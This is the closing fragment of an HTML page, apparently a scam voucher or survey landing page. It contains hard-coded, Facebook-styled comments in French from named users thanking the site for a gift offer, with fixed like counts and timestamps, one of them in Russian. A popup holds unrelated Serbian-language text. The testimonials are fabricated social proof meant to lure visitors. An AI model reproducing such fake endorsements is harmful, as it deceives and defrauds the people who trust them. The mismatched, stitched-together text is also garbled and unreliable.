                    Alex Colin
                        </span>
                        <br/>   J'ai reçu cette offre d'un ami et je le remercie pour cette incroyable opportunité ahahaha

                      </p>
                      <p class='combot' style='display: block;'>
                        <span class='ago'>
                          il y a 9 minutes
                        </span>
                        &#183; 
                        <span class='fblike'>
                          Like
                        </span>
                      </p>
                    </div>
                    
                    <div class='item'>
                      <img class='profileimg' height='50' src='https://i.imgur.com/b6E9XNw.png' width='50'/>
                      <p class='comtxt'>
                        <span class='name'>
                         Paul Buresi 
o
                        </span>
                        <br/>
                  ce matin j'ai donné le bon à ma femme pour son anniversaire... je vous remercie
                      </p>
                      <p class='combot'>
                        <span class='ago'>
                          19 минут назад
                        </span>
                        &#183; 
                        <span class='fblike'>
                          Like
                        </span>
                        <span class='likes totlikes'>
                          112
                        </span>
                      </p>
                    </div>
                  </div>
                  <br/>
                <div>
                <div class='pops'>
                  <img alt='' id='piplovi' src='img/piplovi.png'/>
                  <p>
                    AMAN ZAMAN BRATE NEMAC NEMO ME UBIJES BREEEE BREE BREEE
                  </p>
                  <img alt='' id='iks' src='img/iks.png'/>
                </div>
                  </div>
              <!-- survey-inner -->
            </div>
          </div>
          <!-- survey -->
                </div>
        <!-- content-inner -->
      </div>
                </div>
    <!-- content -->
  </div>
  <!-- container -->


<b:section id='fixelements' showaddelement='no'/>

    </body>



              </html>


			  
